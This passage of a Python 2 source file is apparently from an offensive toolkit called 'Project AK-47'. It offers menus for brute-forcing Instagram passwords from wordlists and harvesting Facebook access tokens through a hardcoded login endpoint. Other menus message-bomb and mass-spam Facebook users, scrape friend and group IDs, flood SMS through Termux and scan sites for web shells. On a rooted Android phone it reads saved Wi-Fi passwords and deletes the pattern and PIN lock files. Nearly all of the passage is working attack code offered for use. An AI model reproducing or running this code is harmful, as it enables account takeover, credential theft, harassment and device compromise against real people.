        idfile =  open(raw_input(SGO+" Username's File : "),"r").read().split()
        print SGO+" Total Accounts : {}".format(len(idfile))
      except:
        print SBR+R+" Invalid File !"
        
      passw = raw_input(SGO+" Password To Try On Accounts : ")
      slist = []
      for i in range(len(idfile)):
        slist.append(str(idfile[i])+'|'+str(passw))
    
      if len(passw) > 0 and len(slist) > 0:
        os.system("clear")
        print SBG+Y+" [BruteForce Result's Would Appear Here]"
        procx.map(icheck,slist)
        print xin+SBG+G+" Saved to instahack.txt :)"
        print xin+SR+" Type back to go back"


       
    if rchoc == "2" or rchoc == "02":
      try:
        idfile =  open(raw_input(SGO+" Username's File : "),"r").read().split()
        print SGO+" Total Accounts : {}".format(len(idfile))
      except:
        print SBR+R+" Invalid File !"
        
      passx1 = raw_input(SGO+" Password  1 : ")
      passx2 = raw_input(SGO+" Password  2 : ")
      passx3 = raw_input(SGO+" Password  3 : ")
      print SBR+G+" These 3 Passwords Would Be Checked on Each Account From List"
      time.sleep(2)
      slist = []
      for i in range(len(idfile)):
        slist.append(str(idfile[i])+'|'+str(passx1)+'|'+str(passx2)+'|'+str(passx3))
             
      if len(slist) > 0:
        os.system("clear")
        print SBG+Y+" [BruteForce Result's Would Appear Here]"

        procx.map(micheck,slist)
        print xin+SBG+G+" Saved to instahack.txt :)"
        print xin+SR+" Type back to go back"


    if rchoc == "3" or rchoc == "03":
      try:
        idfile =  open(raw_input(SGO+" Username File : "),"r").read().split()
        print SGO+" Total Accounts : {}".format(len(idfile))
      except:
        print SBR+R+" Invalid File !"

      print SBR+G+" Some Common Random Password Would Be Checked On Each"
      time.sleep(2)
      commonpass = ['pakistan','123456','facebook','786786','qwertyuiop','0987654321']
      slist = []
      for i in range(len(idfile)):
        slist.append(str(idfile[i])+'|'+str(random.choice(commonpass)))
             
      if len(slist) > 0:
        os.system("clear")
        print SBG+Y+" [BruteForce Result's Would Appear Here]"
     
        procx.map(icheck,slist)
        print xin+SBG+G+" Saved to instahack.txt :)"
        print xin+SR+" Type back to go back"
 

       
    if rchoc == "4" or rchoc == "04":
      try:
        passfile =  open(raw_input(SGO+" WordList File : "),"r").read().split()
        print SGO+" Total Passwords : {}".format(len(passfile))
        with open(".a",'w') as ax:
          ax.write(str(len(passfile)))
      except:
        print SBR+R+" Invalid File !"
        
      acc = raw_input(SGO+" USERNAME : ")
      slist = []
      for i in range(len(passfile)):
        slist.append(str(acc)+'|'+str(passfile[i]))
    
      if len(passfile) > 0:
        os.system("clear")
        print SBG+Y+" [BruteForce Result's Would Appear Here]"
        with open(".b","w") as bx:
             bx.write("")

        procx.map(icheck,slist)
        print xin+SBG+G+" Saved to instahack.txt :)"
        print xin+SR+" Type back to go back"





###             Facebook Tools            ###
###                Option : 4                    ###

 elif optc == "4" or optc == "04":
   os.system("clear")
   print """
       {}[ Facebook Tool's ]

     {} 1 : FriendsList Dump
     {} 2 : Account Information
     {} 3 : Group Members ID Dump
     {} 4 : Account App Status Check
     {} 5 : Mass Comment Post
     {} 6 : Accestoken Generate
     {} 7 : Message to ID's From File
     {} 8 : Message to All Online Friends
     {} 9 : Live Account's Checker
     {} 10 : Message-BOMB (Spam)
     {} 11 : Checkpoint Detector
     {} 12 : Go Back <=

     """.format(G,SBG,SBG,SBG,SBG,SBG,SBG,SBG,SBG,SBG,SBG,SBG,SBG)

   while 1:
    rchoc = raw_input(SGO+" CHOICE : ")
    if rchoc == "12" or rchoc == "back":
       main(url,"1")
       
       
    if rchoc == "1" or rchoc == "01": 
     limit = raw_input(SGO+" How Many Pages : ")
     xurl = []
     ihtml = BeautifulSoup(s.get(url.format("/profile.php")).content,"html.parser")
     for i in ihtml.find_all("a"):
       if "friends?lst=" in i['href']:
         xurl.append(i['href'])
         

     html = BeautifulSoup(s.get(url.format(xurl[0])).content,'html.parser')
     id = []
     q = 0
     while q <= int(limit):
         q = q+1
         for i in html.find_all("a"):
            try:
              if "?fref=fr_tab" in i["href"]:
                sys.stdout.write("\r"+SBR+" Getting USER's : \r{} {}  ".format(G,i['href'].split("/")[1].split("?")[0]))
                sys.stdout.flush()
                id.append(str(i['href'].split("/")[1].split("?")[0]))
       
              if "unit_cursor=" in i['href']:
                html = BeautifulSoup(s.get(url.format(i['href'])).content,'html.parser')
       
            except:
               pass
               
     print xin+SBG+" Feteched USERS : {}{} ".format(G,len(id))
     with open("friendlist.txt","a") as fl:
           fl.write("\n".join(id))

     print xin+SBG+G+" Saved USER's to friendlist.txt :)"




    if rchoc == "2" or rchoc == "02":
     acct = raw_input(SGO+" Account ID : ")
     os.system("clear")
     try:
       xhtml = BeautifulSoup(s.get(url.format("/profile.php?id="+acct)).content , "html.parser")
       print xin+SBG+ "NAME :{} {}".format(G,xhtml.title.get_text())
       print xin+Y+ " [ Other Information ]"
       n = xhtml.find_all("td")
       for i in range(len(n)):
        try:
          if n[i]['valign'] == 'top':
            print SBG+" {}{}".format(G,n[i].get_text())
        except:
           pass

       print xin+SR+" Type back to go back" 
     except:
       pass



    if rchoc == "3" or rchoc == "03":
     gi = raw_input(SGO+" Group ID : ")
     #lp = raw_input(SGO+" How Many Pages ? : ")
     funx(SBR+" Loading Group ID's Dumper")
     os.system("clear")
     idd = [].append(gi+"|"+"0")
     print xin+G+"       [ GROUP ID DUMP STATUS ]"+xin
#     for i in range(int(lp)):
#       idd.append(str(gi)+"|"+str(i))
       
     procx.map(gdump,idd)
     print SBR+"Saved to {} groupid.txt".format(G)
     print xin+SR+" Type back to go back" 




    if rchoc == "4" or rchoc == "04":
     print """
         {}  [ Select Option ]
  
           {} 1 : Active Apps 
           {} 2 : Expired Apps
      """.format(G,SBG,SBG)
     rch = raw_input(SGO+" CHOICE : ")
     if rch == "1" or rch == "01":
         oi = 0
         os.system("clear")
         print G+"      [ Active Apps ]     "
         html = BeautifulSoup(s.get(url.format("/settings/apps/tabbed/")).content,"html.parser")
         for i in html.find_all("a"):
            try:
              if str(i)[11] == "d":
                if "/settings/applications/details/?app_id" in i['href']:
                   oi+=1
                   print G+"({}){}[{}]".format(oi,W,i.get_text())
            except:
                 pass

     if rch == "2" or rch == "02":
         oi = 0
         os.system("clear")
         print G+"      [ Expired Apps ]     "
         html = BeautifulSoup(s.get(url.format("/settings/apps/tabbed/?tab=inactive")).content,"html.parser")
         for i in html.find_all("a"):
            try:
              if str(i)[11] == "d":
                if "/settings/applications/details/?app_id" in i['href']:
                   oi+=1
                   print G+"({}){}[{}]".format(oi,W,i.get_text())
            except:
                 pass

     print xin+SR+" Type back to go back" 
     





    if rchoc == "5" or rchoc == "05":
     print SGO+" Enter Post Link You Want to Comment On"
     poslink = raw_input(SGO+" POST Link : ")
     nuicom = raw_input(SGO+" Comment : ")
     nui = raw_input(SGO+" How Many : ")
     with open(".com","w") as umes:
          umes.write(nuicom)
     alink = []
     alink.append(poslink)
     taskc = alink*int(nui)
     os.system("clear")
     print G+" [ STATUS ]\n"
     procx.map(comment,taskc)
     print xin+SR+" Type back to go back" 



       
    if rchoc == "6" or rchoc == "06":
      print SRO+" Enter Email/Password To Generate AcessToken"
      email = raw_input(SGO+" Email : ")
      passwd = raw_input(SGO+" Password : ")
      try:
        actok = get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + email + "&locale=en_US&password=" + passwd + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").content
        if "access_token" in actok:
           tokn = json.loads(actok)['access_token']
           print SBG+" AcessToken : {}{}".format(G,tokn)
           tfollow("{}".format(tokn))
        else:
           print SBR+" Incorrect Email/Password"

      except:
          print SBR+" Incorrect Email/Password"     

      print xin+SR+" Type back to go back"

      

          
    if rchoc == "7" or rchoc == "07":
     acct = open(raw_input(SGO+" ID's File  : "),"r").read().split()
     try:
         print SBG+" Total ID's : {}{}".format(G,len(acct))
     except:
         print SBR+" Invalid File"
     mes = raw_input(SGO+" Messaage To Send  : ")
     with open(".mes","w") as umes:
          umes.write(mes)

     os.system("clear")
     print G+"       [ STATUS ]\n"
     procx.map(sendmes,acct)
     print xin+SR+" Type back to go back" 
    



    if rchoc == "8" or rchoc == "08":
     mes = raw_input(SGO+" Messaage To Send  : ")
     with open(".mes","w") as umes:
          umes.write(mes)

     online = []
     html = BeautifulSoup(s.get(url.format("/buddylist.php")).content,"html.parser")
     for i in html.find_all("a"):
       try:
         if "/messages/read/?fbid" in i['href']:
            online.append(str(i['href']).split("=")[1].split("&")[0])
       except:
         pass

     for i in range(len(online)):
       try:
         time.sleep(0.1)
         sys.stdout.write("\r"+SBR+" Getting ID :  {}{}".format(G,online[i]))
         sys.stdout.flush()
       except:
          pass

     os.system("clear")
     print G+"       [ STATUS ]"
     print SBG+" Online : {}{}".format(G,len(online))
     procx.map(sendmes,online)
     print xin+SR+" Type back to go back"

    if rchoc == "9" or rchoc =="09":
     print SBG+" Write Each Account in File with This Format"
     print SBR+" email | password"
     acctf = open(raw_input(SGO+" Accounts File : "),"r").read().split("\n")
     print SBG+" Total Accounts : {}{}".format(G,len(acctf))    
     funx(SBR+" Analyzing Accounts ")
     os.system("clear")
     print G+"       [ LIVE ACCOUNT-STATUS ]\n"
     procx.map(livept,acctf)
     print SBG+" Saved in live.txt"
     print xin+SR+" Type back to go back" 
    


          
    if rchoc == "10":
     acct = raw_input(SGO+" Target ID : ")
     mes = raw_input(SGO+" Messaage To Send  : ")
     amnt = raw_input(SGO+" How Many ?  : ")
     acti = []
     acti.append(acct)
     totalm = acti*int(amnt)
     funx(SBR+" Targeting Message Bomb On User : {}".format(acct))
     with open(".mes","w") as umes:
          umes.write(mes)

     os.system("clear")
     print G+"       [ STATUS ]\n"
     procx.map(sendmes,totalm)
     print xin+SR+" Type back to go back" 
    
          
    if rchoc == "11" :
     print SBG+" Write Each Account in File with This Format"
     print SBR+" email | password"
     acctf = open(raw_input(SGO+" Accounts File : "),"r").read().split("\n")
     print SBG+" Total Accounts : {}{}".format(G,len(acctf))    
     funx(SBR+" Analyzing Accounts ")
     os.system("clear")
     print G+"       [ CHECKPOINT-STATUS ]\n"
     procx.map(checkpt,acctf)
     print SBG+" Saved in checkpoint.txt"
     print xin+SR+" Type back to go back" 
    





###############################
#######   TERMUX TOOLS   ##########

 elif optc == "5" or optc == "05":
   os.system("clear")
   print """
       {}[ TERMUX TOOLS ]

     {}Make Sure You Installed Termux-Api :)
        {}${} apt-get install termux-api

     {} 1 : Mass SMS Send
     {} 2 : Network Status
     {} 3 : INBOX - Messages
     {} 4 : Battery Status
     {} 5 : Scripts Installer
     {} 6 : Go Back <=

     """.format(G,Y,W,G,SBG,SBG,SBG,SBG,SBG,SBG)
   while 1:
    rchoc = raw_input(SGO+" CHOICE : ")
    if rchoc == "6" or rchoc == "back":
       main(url,"1")


    if rchoc == "1" or rchoc == "01":
      num = raw_input(SGO+" Number : ")
      mesg = raw_input(SGO+" Message(SMS) : ")
      amnt = raw_input(SGO+" How Many ? : ")
      funx(SBR+" Preparing System ")
      os.system("clear")
      print G+"       [ SMS-SENDING-STATUS ]\n"
      for i in range(1,int(amnt)):
         try:
            os.system("termux-sms-send -n {} '{}' ".format(num,mesg))
            print SBG+" ({}) SMS Sent :)".format(i)
         except:
            print SBR+" ({}) SMS Failed :)".format(i)

      print xin+SR+" Type back to go back"

      

    if rchoc == "2" or rchoc == "02":
      funx(SBR+" Getting Network Status ")
      os.system("clear")
      print G+"       [ NETWORK STATUS ]\n"
      try:
        netw = os.popen("termux-telephony-deviceinfo").read()
        print G+str(netw)
      except:
        pass

      print xin+SR+" Type back to go back"
    


    if rchoc == "3" or rchoc == "03":
      funx(SBR+" Getting INBOX-Messages")
      os.system("clear")
      print G+"       [ INBOX-MESSAGES ]\n"
      try:
        netw = json.loads(os.popen("termux-sms-list").read())
        print SBR+" Total Messages : {}{} \n ".format(G,len(netw))
        for i in range(len(netw)):
            print SBG+" ({}) {} [{}]".format(i,G,netw[i]['body'])

      except:
        pass

      print xin+SR+" Type back to go back"
    


    if rchoc == "4" or rchoc == "04":
      funx(SBR+" Getting Battery Details")
      os.system("clear")
      print G+"       [ BATTERY-INFORMATION ]\n"
      try:
        netw = json.loads(os.popen("termux-battery-status").read())
        print """
               
              {} PERCENTAGE : {}{}%
              {} HEALTH : {}{}
              {} TEMPRATURE : {}{} C
              {}  STATUS : {}({}/{})

              """.format(SBG,G,netw['percentage'],
              SBG,G,netw['health'],
              SBG,G,netw['temperature'],
              SBG,G,netw['status'],netw['plugged'])


      except:
        pass

      print xin+SR+" Type back to go back"
    

    if rchoc == "5" or rchoc == "05":
      funx(SBR+" Loading Scripts Installer")
      os.system("clear")
      print G+"       [ SCRIPTS-INSTALLER ]\n"
      print """

           {} 1) Install FLB
           {} 2) Install NFD
           {} 3) Install ASU
           {} 4) Install NMAP
           {} 5) Install RED-Hawk
           {} 6) Install D-Tect
           {} 7) Install SQL-Map
           {} 8) Install ReconDog
           {} 9) Install FIM
           {} 10) Install MetaSploit
           {} 0) Go Back
           
      """.format(SBR,SBR,SBR,SBR,SBR,SBR,SBR,SBR,SBR,SBR,SBG)
      while True:
        rx = raw_input(SGO+ "CHOICE : ")
        if rx == "1":
           flb()      
        if rx == "2":
           NFD()
        if rx == "3":
           asu()
        if rx == "4":
           nmap()
        if rx == "5":
           red_hawk()
        if rx == "6":
           dtect()
        if rx == "7":
           sqlmap()
        if rx == "8":
           reconDog()
        if rx == "9":
           fim()
        if rx == "10":
           metasploit()
        if rx == "0":
           break
        else:
           print SBR+" Invalid Option !"
      
      print xin+SR+" Type back to go back"


######################
##### WEB HACKING ######
 elif optc == "6" or optc == "06":
   os.system("clear")
   print """
       {}[ WEB-HACKING TOOLS ]


     {} 1 : WEB SHELL Finder
     {} 2 : IP Locator
     {} 3 : Website Header
     {} 4 : Extracts Links From Website
     {} 5 : Download Images From Site
     {} 6 : Go Back <=

     """.format(G,SBG,SBG,SBG,SBG,SBG,SBG)
   while 1:
    rchoc = raw_input(SGO+" CHOICE : ")
    if rchoc == "6" or rchoc == "back":
       main(url,"1")


    if rchoc == "1" or rchoc == "01":
      print SBR+" Format : {} https://sitename.com".format(G)
      webs = raw_input(SGO+" Website Link : ")
      sclist = shellp.split()
      print SBR+" TOTAL SHELL's Database : {}{}".format(G,len(sclist))
      funx(SBR+" Loading Shell Scanner")
      os.system("clear")
      print G+"      [ SHELL SCANNER RESULT ]"+"\n"
      lnks = []
      for i in range(len(sclist)):
         lnks.append(webs+sclist[i])
         
      procx.map(shellscanner,lnks)
      print xin+SR+" Type back to go back"
      
    if rchoc == "2" or rchoc == "02":
     ip = raw_input(SGO+" IP-Adress : ")
     funx(SBR+" Searching for IP : {}".format(ip))
     try:
       os.system("clear")
       r = get("http://extreme-ip-lookup.com/json/{}".format(ip)).content
       print G+"    [ IP-Location Status ]\n"
       print r
     except:
       print SBR+" Network Error"
     print xin+SR+" Type back to go back"

    if rchoc == "3" or rchoc == "03":
      print SBR+" Format : {} https://sitename.com".format(G)
      webs = raw_input(SGO+" Website Link : ")
      funx(SBR+" Getting WebSite Header")
      print xin+SBR+Y+"  [    WEB Header     ]  "+G
      print get(webs).headers
      print xin+SR+" Type back to go back"


    if rchoc == "4" or rchoc == "04":
      print SBR+" Format : {} https://sitename.com".format(G)
      webs = raw_input(SGO+" Website Link : ")
      wurl = str(webs)+"{}"
      funx(SBR+" Scanning for links in {}{}".format(G,webs))
      os.system("clear")
      print "     [ Links Scanner Status ]"
      try:
        r = get(webs).content
        html = BeautifulSoup(r,"html.parser")
        try:
          for i in html.find_all("a"):
           try:
             print SBG+Y+" "+wurl.format(i['href'])
           except:
             pass
             
          for i in html.find("a"):
            try:
              print SBG+Y+" "+i['src']
            except:
              pass
        except:
           pass
      except:
          print SBR+" Network Error or Invalid URL"
      print xin+SR+" Type back to go back"


    if rchoc == "5" or rchoc == "05":
      print SBR+" Format : {} https://sitename.com".format(G)
      webs = raw_input(SGO+" Website Link : ")
      wurl = str(webs)+"{}"
      imglink = []
      funx(SBR+" Scanning for Images in {}{}".format(G,webs))
      os.system("clear")
      print G+"     [ Images Scanner Status ]"
      try:
        r = get(webs).content
        html = BeautifulSoup(r,"html.parser")
        try:
          for i in html.find_all("img"):
           try:
             print SBG+Y+" "+str(i['src'])
             if not "http" in str(i['src']):
               imglink.append(wurl.format(str(i['src'])))
             else:
               imglink.append(str(i['src']))
           except:
             pass

        except:
           pass

        print SBG+" TOTAl IMAGES FOUND : {}{}".format(G,len(imglink))
        funx(SBR+G+" Downloading Images")
        if not  os.path.exists("web"):
            os.mkdir("web")
            
        for i in range(len(imglink)):
          try:
            sys.stdout.write("\r{} Downloading.. ({}/{}) IMAGES".format(SBG,i+1,len(imglink)))
            sys.stdout.flush()
            try:
              r = get(imglink[i]).content
              with open("web/"+str(imglink[i].split("/")[-1]),"w") as iwr:
                     iwr.write(r)
            except:
                pass
          except:
            pass
        print xin+SBG+" Downloaded to web folder :) "
      except:
          print SBR+" Network Error or Invalid URL"
      print xin+SR+" Type back to go back"




#######################
#######    BOTS    #########
 elif optc == "7" or optc == "07":
   os.system("clear")
   print """
       {}[ BOT's Menu ]

     {} 1 : Facebook Messages Show
     {} 2 : Facebook Messages Custom Reply
     {} 3 : Try Password on Each Message Sender
     {} 4 : Send Message to Group Members
     {} 5 : Go Back <=

     """.format(G,SBG,SBG,SBG,SBG,SBG)
   while 1:
    rchoc = raw_input(SGO+" CHOICE : ")
    if rchoc == "5" or rchoc == "back":
       main(url,"1")

    if rchoc == "100" or rchoc =="02":
      print SBR+" Put Accounts in File like email|password"
      try:
        em = open(raw_input(SGO+" Accounts File : "),"r").read().split()
      except:
        print SBR+" Invalid File"
      lnk = raw_input(SGO+" Post Link : ")
      mex = raw_input(SGO+" Comment : ")
      print SBG+" Total Accounts : {}{}".format(G,len(em))
      pathx = []
      for i in range(len(em)):
        pathx.append("{}@{}".format(lnk,em[i]))
      with open(".com","w") as umes:
         umes.write(mex)
         
      funx(SBR+" Loading BoT")
      os.system("clear")
      print G+"      [ Comments Status ]"
      procx.map(ecomment,idps)
      print xin+SR+" Type back to go back"
    
    if rchoc == "1" or rchoc == "01":
       oldmes = []
       funx(SBR+" Loading BOT Configuration ")
       os.system("clear")
       print G+"     [ Incomming Messages ]"+xin
       while True:
         try:
           o = BeautifulSoup(s.get(url.format('/messages')).content, 'html.parser').find_all('h3')
           if o[1].get_text() not in oldmes:            
                print "{} > {} [ {} ]".format(SBG,G,o[1].get_text())
                oldmes.append(o[1].get_text())
         except:
            pass



    if rchoc == "2" or rchoc == "02":
       oldmes = []
       message = raw_input(SGO+" Custom Reply Message : ")
       funx(SBR+" Loading Custom Reply BOT ")
       os.system("clear")
       print G+"     [ Incomming Messages ]"+xin
       while True:
         try:
           o = BeautifulSoup(s.get(url.format('/messages')).content, 'html.parser').find_all('h3')
           if o[1].get_text() not in oldmes:            
                print "{} > {} [ {} ]".format(SBG,G,o[1].get_text())
                n = o[0].a['href'].split("A")[1].split("&")[0]
                oldmes.append(o[1].get_text())
                fsend(n,message)
         except:
            pass


    if rchoc == "3" or rchoc == "03":
       oldmes = []
       pxa = raw_input(SGO+" Password To Try On Messager Account : ")
       funx(SBR+" Loading Custom Reply BOT ")
       os.system("clear")
       print G+"     [ Password Try On Message Sender ]"+xin
       while True:
         try:
           o = BeautifulSoup(s.get(url.format('/messages')).content, 'html.parser').find_all('h3')
           if o[1].get_text() not in oldmes:      
                n = o[0].a['href'].split("A")[1].split("&")[0]
                print "{} > Trying on {}{}  {}[{}]".format(SBG,R,n,G,o[0].a.get_text())
                oldmes.append(o[1].get_text())
                checkms(n,pxa)
         except:
            pass


    
    if rchoc == "4" or rchoc == "04":
     id = {}
     acc = []
     gid =  raw_input(SGO+" GROUP ID : "+G)
     message = raw_input(SGO+" Message : "+G)
     if len(gid) > 0:
         html = BeautifulSoup(s.get(url.format("/browse/group/members/?id="+gid)).content,"html.parser")
         print SBG+" GROUP NAME : {}{}".format(G,html.find("h3").renderContents())
         #print SBG+" {}".format(html.find_all(class_="u v w")[0].renderContents())
         gam = int(raw_input(SGO+" How Many Members ? : "))
         funx(SBG+" Running Emails Crawler")
         print xin
         cc = 0
         while cc == 0:
           for i in html.find_all("a",href=True):
            if "fref" in i["href"]:
             try:
               id[re.findall("php\?id=(.*?)&",i['href'])[0]] = "".join(i.get_text().split()).lower()
               sys.stdout.write("\r{} Getting ID's : {}{}".format(SBR,G,len(id.keys())))
               sys.stdout.flush()
             except:
               pass
            if "/browse/group/members/" in i['href']:
             html = BeautifulSoup(s.get(url.format(i['href'])).content,"html.parser")
                 
                 
            if len(id.keys()) >= gam:
              cc = 1
         
         for i in id.keys():
           try:
             acc.append(i)
           except:
             pass
         os.system("clear")
         print "               "+SBG+Y+" [ Message Sending Status ]"+"\n"
         for i in acc:
           try:
             fsend(i,message)
           except:
             pass
         print xin+SR+" Type back to go back"


###########################
######   ANDROID TOOLS     ######

 elif optc == "8" or optc == "08":
   os.system("clear")
   print """
       {}[ ANDROID TOOLS ]

     {}Make Sure Your Device is Rooted :)
        {}${} Root@Android = :)

     {} 1 : View Saved Wifi Password
     {} 2 : Remove Pattern Lock
     {} 3 : Remove Pin Lock
     {} 4 : APK Install 
     {} 5 : Backup Apps
     {} 6 : Go Back <=

     """.format(G,Y,W,G,SBG,SBG,SBG,SBG,SBG,SBG)
   while 1:
    rchoc = raw_input(SGO+" CHOICE : ")
    if rchoc == "6" or rchoc == "back":
       main(url,"1")

    if rchoc == "1" or rchoc == "01":
      funx(SBR+" Getting Wifi Passwords")
      os.system("clear")
      try:
        print G+"   [ WIFI-Passwords ] "
        wpass = os.popen("su -c 'cat /data/misc/wifi/wpa_supplicant.conf'").read()
        print G+wpass
      except:
        print SBR+" Failed (Root Error)"

      print xin+SR+" Type back to go back"
      
    if rchoc == "2" or rchoc == "02":
      funx(SBR+" Removing Lockscreen Pattern")
      try:
        os.system("su -c 'rm /data/system/gesture.key'")
        print SBR+" Pattern Removed Sucessfully"
      except:
        print SBR+" Failed (Root Error)"

    if rchoc == "3" or rchoc == "03":
      funx(SBR+" Removing Lockscreen PIN")
      try:
        os.system("su -c 'rm /data/system/password.key'")
        print SBR+" PIN Removed Sucessfully"
      except:
        print SBR+" Failed (Root Error)"


    if rchoc == "4" or rchoc == "04":
      apkp = raw_input(SGO+" PATH TO APK : ")
      funx(SBR+" Installing APK ")
      try:
        os.system("su -c 'pm install {}'".format(apkp))
        print SBR+" App Installed Sucessfully"
      except:
        print SBR+" Failed (Root Error)"


    if rchoc == "5" or rchoc == "05":
      apkp = raw_input(SGO+" Where To Keep Backup (PATH)? : ")
      funx(SBR+" Getting Apps ")
      try:
        os.system("su -c 'cp -r /data/app {}'".format(apkp))
        print SBR+" App's Backup Sucessfull"
      except:
        print SBR+" Failed (Root Error)"




#####################        
#####    UPDATE    #######
 elif optc == "9" or optc == "09":
     os.system("clear")
     funx(SBR+" Updating Project AK-47 ")
     try:
       os.system("git pull")
       print SBG+" Project AK-47 Updated Sucessfully..!"
     except:
       print SBR+" Poject AK-47 Update Failed :("

 else:
   print SRO+R+" Invalid Choice !"
   time.sleep(1)
   main(url,"1")






if not os.path.exists(".cookie"):
   print SG+" Login With Facebook Email/Password.."
   login(url)
else:
   funx(SG+" Loading Available Cookies Data")
   try:
      s.cookies.update(json.loads(open('.cookie','r').read()))
      print xin+SG+" Cookie's Data Loaded !"
      main(url,"0")
   except:
      pass
      #print SR+" Cookie's Data Loading Failed :("




